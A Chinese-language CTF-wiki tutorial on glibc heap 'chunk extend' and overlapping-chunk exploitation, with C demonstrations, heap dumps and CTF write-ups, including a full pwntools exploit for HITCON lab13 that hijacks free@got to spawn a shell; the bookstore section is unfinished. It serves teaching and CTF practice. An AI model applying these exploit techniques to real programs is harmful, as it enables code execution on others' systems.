[EN](./chunk_extend_overlapping.md) | [ZH](./chunk_extend_overlapping-zh.md)
# Chunk Extend and Overlapping

## 介绍
chunk extend是堆漏洞的一种常见利用手法，通过extend可以实现chunk overlapping的效果。这种利用方法需要以下的时机和条件：

* 程序中存在基于堆的漏洞
* 漏洞可以控制 chunk header 中的数据

## 原理
chunk extend技术能够产生的原因在于ptmalloc在对堆chunk进行操作时使用的各种宏。

在ptmalloc中，获取 chunk 块大小的操作如下
```
/* Get size, ignoring use bits */
#define chunksize(p) (chunksize_nomask(p) & ~(SIZE_BITS))

/* Like chunksize, but do not mask SIZE_BITS.  */
#define chunksize_nomask(p) ((p)->mchunk_size)
```
一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分。

在 ptmalloc 中，获取下一 chunk 块地址的操作如下
```
/* Ptr to next physical malloc_chunk. */
#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))
```
即使用当前块指针加上当前块大小。

在 ptmalloc 中，获取前一个 chunk 信息的操作如下
```
/* Size of the chunk below P.  Only valid if prev_inuse (P).  */
#define prev_size(p) ((p)->mchunk_prev_size)

/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */
#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))
```
即通过malloc_chunk->prev_size获取前一块大小，然后使用本 chunk 地址减去所得大小。

在 ptmalloc，判断当前 chunk 是否是use状态的操作如下：
```
#define inuse(p)
    ((((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size) & PREV_INUSE)
```
即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。

更多的操作详见 `堆相关数据结构` 一节。

通过上面几个宏可以看出，ptmalloc通过chunk header的数据判断chunk的使用情况和对chunk的前后块进行定位。简而言之，chunk extend就是通过控制size和pre_size域来实现跨越块操作从而导致overlapping的。

与chunk extend类似的还有一种称为chunk shrink的操作。这里只介绍chunk extend的利用。

## 基本示例1：对inuse的fastbin进行extend
简单来说，该利用的效果是通过更改第一个块的大小来控制第二个块的内容。
**注意，我们的示例都是在64位的程序。如果想在32位下进行测试，可以把8字节偏移改为4字节**。
```
int main(void)
{
    void *ptr,*ptr1;
    
    ptr=malloc(0x10);//分配第一个0x10的chunk
    malloc(0x10);//分配第二个0x10的chunk
    
    *(long long *)((long long)ptr-0x8)=0x41;// 修改第一个块的size域
    
    free(ptr);
    ptr1=malloc(0x30);// 实现 extend，控制了第二个块的内容
    return 0;
}
```
当两个malloc语句执行之后，堆的内存分布如下
```
0x602000:	0x0000000000000000	0x0000000000000021 <=== chunk 1
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000021 <=== chunk 2
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000020fc1 <=== top chunk
```
之后，我们把 chunk1 的 size 域更改为 0x41，0x41 是因为 chunk 的 size 域包含了用户控制的大小和 header 的大小。如上所示正好大小为0x40。在题目中这一步可以由堆溢出得到。
```
0x602000:	0x0000000000000000	0x0000000000000041 <=== 篡改大小
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000021
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000020fc1 
```
执行 free 之后，我们可以看到 chunk2 与 chunk1 合成一个 0x40 大小的 chunk，一起释放了。
```
Fastbins[idx=0, size=0x10] 0x00
Fastbins[idx=1, size=0x20] 0x00
Fastbins[idx=2, size=0x30]  ←  Chunk(addr=0x602010, size=0x40, flags=PREV_INUSE) 
Fastbins[idx=3, size=0x40] 0x00
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60] 0x00
Fastbins[idx=6, size=0x70] 0x00
```
之后我们通过 malloc(0x30) 得到 chunk1+chunk2 的块，此时就可以直接控制chunk2中的内容，我们也把这种状态称为 overlapping chunk。
```
call   0x400450 <malloc@plt>
mov    QWORD PTR [rbp-0x8], rax

rax = 0x602010
```

## 基本示例2：对inuse的smallbin进行extend
通过之前深入理解堆的实现部分的内容，我们得知处于 fastbin 范围的 chunk 释放后会被置入 fastbin 链表中，而不处于这个范围的 chunk 被释放后会被置于unsorted bin链表中。
以下这个示例中，我们使用 0x80 这个大小来分配堆（作为对比，fastbin 默认的最大的 chunk 可使用范围是0x70）
```
int main()
{
    void *ptr,*ptr1;
    
    ptr=malloc(0x80);//分配第一个 0x80 的chunk1
    malloc(0x10); //分配第二个 0x10 的chunk2
    malloc(0x10); //防止与top chunk合并
    
    *(int *)((int)ptr-0x8)=0xb1;
    free(ptr);
    ptr1=malloc(0xa0);
}
```
在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和top chunk合并。所以我们需要额外分配一个chunk，把释放的块与top chunk隔开。
```
0x602000:	0x0000000000000000	0x00000000000000b1 <===chunk1 篡改size域
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000000	0x0000000000000021 <=== chunk2
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x0000000000000000	0x0000000000000021 <=== 防止合并的chunk
0x6020c0:	0x0000000000000000	0x0000000000000000
0x6020d0:	0x0000000000000000	0x0000000000020f31 <=== top chunk
```
释放后，chunk1 把 chunk2 的内容吞并掉并一起置入unsorted bin
```
0x602000:	0x0000000000000000	0x00000000000000b1 <=== 被放入unsorted bin
0x602010:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000000	0x0000000000000021
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x00000000000000b0	0x0000000000000020 <=== 注意此处标记为空
0x6020c0:	0x0000000000000000	0x0000000000000000
0x6020d0:	0x0000000000000000	0x0000000000020f31 <=== top chunk
```
```
[+] unsorted_bins[0]: fw=0x602000, bk=0x602000
 →   Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE)
```
再次进行分配的时候就会取回 chunk1 和 chunk2 的空间，此时我们就可以控制 chunk2 中的内容
```
     0x4005b0 <main+74>        call   0x400450 <malloc@plt>
 →   0x4005b5 <main+79>        mov    QWORD PTR [rbp-0x8], rax
 
     rax : 0x0000000000602010
```

## 基本示例3：对free的smallbin进行extend
示例3是在示例2的基础上进行的，这次我们先释放 chunk1，然后再修改处于 unsorted bin 中的 chunk1 的size域。
```
int main()
{
    void *ptr,*ptr1;
    
    ptr=malloc(0x80);//分配第一个0x80的chunk1
    malloc(0x10);//分配第二个0x10的chunk2
    
    free(ptr);//首先进行释放，使得chunk1进入unsorted bin
    
    *(int *)((int)ptr-0x8)=0xb1;
    ptr1=malloc(0xa0);
}
```
两次 malloc 之后的结果如下
```
0x602000:	0x0000000000000000	0x0000000000000091 <=== chunk 1
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000000	0x0000000000000021 <=== chunk 2
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x0000000000000000	0x0000000000020f51
```
我们首先释放chunk1使它进入unsorted bin中
```
     unsorted_bins[0]: fw=0x602000, bk=0x602000
 →   Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE)

0x602000:	0x0000000000000000	0x0000000000000091 <=== 进入unsorted bin
0x602010:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000090	0x0000000000000020 <=== chunk 2
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x0000000000000000	0x0000000000020f51 <=== top chunk
```
然后篡改chunk1的size域
```
0x602000:	0x0000000000000000	0x00000000000000b1 <=== size域被篡改
0x602010:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000090	0x0000000000000020
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x0000000000000000	0x0000000000020f51
```
此时再进行 malloc 分配就可以得到 chunk1+chunk2 的堆块，从而控制了chunk2 的内容。

## Chunk Extend/Shrink 可以做什么  

一般来说，这种技术并不能直接控制程序的执行流程，但是可以控制chunk中的内容。如果 chunk 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄漏和控制执行流程。

此外通过extend可以实现chunk overlapping，通过overlapping可以控制chunk的fd/bk指针从而可以实现 fastbin attack 等利用。

## 基本示例4：通过extend后向overlapping
这里展示通过extend进行后向overlapping，这也是在CTF中最常出现的情况，通过overlapping可以实现其它的一些利用。
```
int main()
{
    void *ptr,*ptr1;
    
    ptr=malloc(0x10);//分配第1个 0x80 的chunk1
    malloc(0x10); //分配第2个 0x10 的chunk2
    malloc(0x10); //分配第3个 0x10 的chunk3
    malloc(0x10); //分配第4个 0x10 的chunk4    
    *(int *)((int)ptr-0x8)=0x61;
    free(ptr);
    ptr1=malloc(0x50);
}
```
在malloc(0x50)对extend区域重新占位后，其中0x10的fastbin块依然可以正常的分配和释放，此时已经构成overlapping，通过对overlapping的进行操作可以实现fastbin attack。

## 基本示例5：通过extend前向overlapping
这里展示通过修改pre_inuse域和pre_size域实现合并前面的块
```
int main(void)
{
	void *ptr1,*ptr2,*ptr3,*ptr4;
	ptr1=malloc(128);//smallbin1
	ptr2=malloc(0x10);//fastbin1
	ptr3=malloc(0x10);//fastbin2
	ptr4=malloc(128);//smallbin2
	malloc(0x10);//防止与top合并
	free(ptr1);
	*(int *)((long long)ptr4-0x8)=0x90;//修改pre_inuse域
	*(int *)((long long)ptr4-0x10)=0xd0;//修改pre_size域
	free(ptr4);//unlink进行前向extend
	malloc(0x150);//占位块
	
}
```
前向extend利用了smallbin的unlink机制，通过修改pre_size域可以跨越多个chunk进行合并实现overlapping。

## HITCON Trainging lab13
[题目链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13)

### 基本信息

```shell
➜  hitcontraning_lab13 git:(master) file heapcreator
heapcreator: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5e69111eca74cba2fb372dfcd3a59f93ca58f858, not stripped
➜  hitcontraning_lab13 git:(master) checksec heapcreator
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/hitcontraning_lab13/heapcreator'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

程序为 64 位动态链接程序，主要开启了 Canary 保护与 NX 保护。

### 基本功能

程序大概是一个自定义的堆分配器，每个堆主要有两个成员：大小与内容指针。主要功能如下

1. 创建堆，根据用户输入的长度，申请对应内存空间，并利用 read 读取指定长度内容。这里长度没有进行检测，当长度为负数时，会出现任意长度堆溢出的漏洞。当然，前提是可以进行 malloc。此外，这里读取之后并没有设置 NULL。
2. 编辑堆，根据指定的索引以及之前存储的堆的大小读取指定内容，但是这里读入的长度会比之前大 1，所以会**存在 off by one 的漏洞**。
3. 展示堆，输出指定索引堆的大小以及内容。
4. 删除堆，删除指定堆，并且将对应指针设置为了 NULL。

### 利用

基本利用思路如下

1. 利用off by one 漏洞覆盖下一个chunk 的 size 字段，从而构造伪造的 chunk 大小。
2. 申请伪造的 chunk 大小，从而产生 chunk overlap，进而修改关键指针。

更加具体的还是直接看脚本吧。

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

r = process('./heapcreator')
heap = ELF('./heapcreator')
libc = ELF('./libc.so.6')


def create(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def edit(idx, content):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(content)


def show(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))


def delete(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))


free_got = 0x602018
create(0x18, "dada")  # 0
create(0x10, "ddaa")  # 1
# overwrite heap 1's struct's size to 0x41
edit(0, "/bin/sh\x00" + "a" * 0x10 + "\x41")
# trigger heap 1's struct to fastbin 0x40
# heap 1's content to fastbin 0x20
delete(1)
# new heap 1's struct will point to old heap 1's content, size 0x20
# new heap 1's content will point to old heap 1's struct, size 0x30
# that is to say we can overwrite new heap 1's struct
# here we overwrite its heap content pointer to free@got
create(0x30, p64(0) * 4 + p64(0x30) + p64(heap.got['free']))  #1
# leak freeaddr
show(1)
r.recvuntil("Content : ")
data = r.recvuntil("Done !")

free_addr = u64(data.split("\n")[0].ljust(8, "\x00"))
libc_base = free_addr - libc.symbols['free']
log.success('libc base addr: ' + hex(libc_base))
system_addr = libc_base + libc.symbols['system']
#gdb.attach(r)
# overwrite free@got with system addr
edit(1, p64(system_addr))
# trigger system("/bin/sh")
delete(0)
r.interactive()
```

## 2015 hacklu bookstore
[题目链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/2015_hacklu_bookstore)

### 基本信息

```shell
➜  2015_hacklu_bookstore git:(master) file books    
books: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3a15f5a8e83e55c535d220473fa76c314d26b124, stripped
➜  2015_hacklu_bookstore git:(master) checksec books    
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/2015_hacklu_bookstore/books'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

可以看出该程序是动态链接的 64 位程序，主要开启了 Canary 与 NX 保护。

### 基本功能

该程序的主要功能是订书，具体如下

- 最多可以订购两本书。
- 根据编号来选择订购第几本书，可以为每本书添加对应的名字。然而在添加名字处出现了任意长度堆溢出的漏洞。
- 根据编号来删除 order，但是这里只是单纯地 free 掉，并没有置为 NULL，因此会出现 use after free 的漏洞。
- 提交订单，将两本书的名字合在一起。这里由于上面堆溢出的问题，这里也会出现堆溢出的漏洞。
- 此外，在程序退出之前存在一个**格式化字符串漏洞**。

这里虽然程序的漏洞能力很强，但是所有进行 malloc 的大小都是完全固定的，我们只能借助这些分配的 chunk 来进行操作。

### 利用思路

程序中主要的漏洞在于堆溢出和格式化字符串漏洞，但是如果想要利用格式化字符串漏洞，必然需要溢出对应的dest 数组。具体思路如下

1. 利用堆溢出进行 chunk extend，使得在 submit 中 `malloc(0x140uLL)` 时，恰好返回第二个订单处的位置。在 submit 之前，布置好堆内存布局，使得把字符串拼接后恰好可以覆盖 dest 为指定的格式化字符串。
2. 通过构造 dest 为指定的格式化字符串：一方面泄漏 __libc_start_main_ret 的地址，**一方面控制程序重新返回执行**。这时，便可以知道 libc 基地址，system 等地址。需要注意的是由于一旦 submit 之后，程序就会直接直接退出，所以我们比较好的思路就是修改 fini_array 中的变量，以便于达到程序执行完毕后，**重新返回我们期待的位置**。这里我们会使用一个trick，程序每次读取选择的时候会读取 128 大小，在栈上。而程序最后在输出 dest 的时候，之前所读取的那部分选择必然是在栈上的，所以我们如果我们在栈上预先布置好一些控制流指针，那就可以来控制程序的执行流程。
3. 再次利用格式化字符串漏洞，覆盖 free@got 为 system 地址，从而达到任意命令执行的目的。

这里，各个参数的偏移是

- Fini_array0 : 5+8=13
- __libc_start_main_ret : 5+0x1a=31。

```
00:0000│ rsp  0x7ffe6a7f3ec8 —▸ 0x400c93 ◂— mov    eax, 0
01:0008│      0x7ffe6a7f3ed0 ◂— 0x100000000
02:0010│      0x7ffe6a7f3ed8 —▸ 0x9f20a0 ◂— 0x3a3120726564724f ('Order 1:')
03:0018│      0x7ffe6a7f3ee0 —▸ 0x400d38 ◂— pop    rcx
04:0020│      0x7ffe6a7f3ee8 —▸ 0x9f2010 ◂— 0x6666666666667325 ('%sffffff')
05:0028│      0x7ffe6a7f3ef0 —▸ 0x9f20a0 ◂— 0x3a3120726564724f ('Order 1:')
06:0030│      0x7ffe6a7f3ef8 —▸ 0x9f2130 ◂— 0x6564724f203a3220 (' 2: Orde')
07:0038│      0x7ffe6a7f3f00 ◂— 0xa35 /* '5\n' */
08:0040│      0x7ffe6a7f3f08 ◂— 0x0
... ↓
0b:0058│      0x7ffe6a7f3f20 ◂— 0xff00000000000000
0c:0060│      0x7ffe6a7f3f28 ◂— 0x0
... ↓
0f:0078│      0x7ffe6a7f3f40 ◂— 0x5f5f00656d697474 /* 'ttime' */
10:0080│      0x7ffe6a7f3f48 ◂— 0x7465675f6f736476 ('vdso_get')
11:0088│      0x7ffe6a7f3f50 ◂— 0x1
12:0090│      0x7ffe6a7f3f58 —▸ 0x400cfd ◂— add    rbx, 1
13:0098│      0x7ffe6a7f3f60 ◂— 0x0
... ↓
15:00a8│      0x7ffe6a7f3f70 —▸ 0x400cb0 ◂— push   r15
16:00b0│      0x7ffe6a7f3f78 —▸ 0x400780 ◂— xor    ebp, ebp
17:00b8│      0x7ffe6a7f3f80 —▸ 0x7ffe6a7f4070 ◂— 0x1
18:00c0│      0x7ffe6a7f3f88 ◂— 0xd8d379f22453ff00
19:00c8│ rbp  0x7ffe6a7f3f90 —▸ 0x400cb0 ◂— push   r15
1a:00d0│      0x7ffe6a7f3f98 —▸ 0x7f9db2113830 (__libc_start_main+240) ◂— mov    edi, eax
```

**！！！待补充！！！**

## 题目

- [2016 Nuit du Hack CTF Quals : night deamonic heap](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/2016_NuitduHack_nightdeamonicheap)

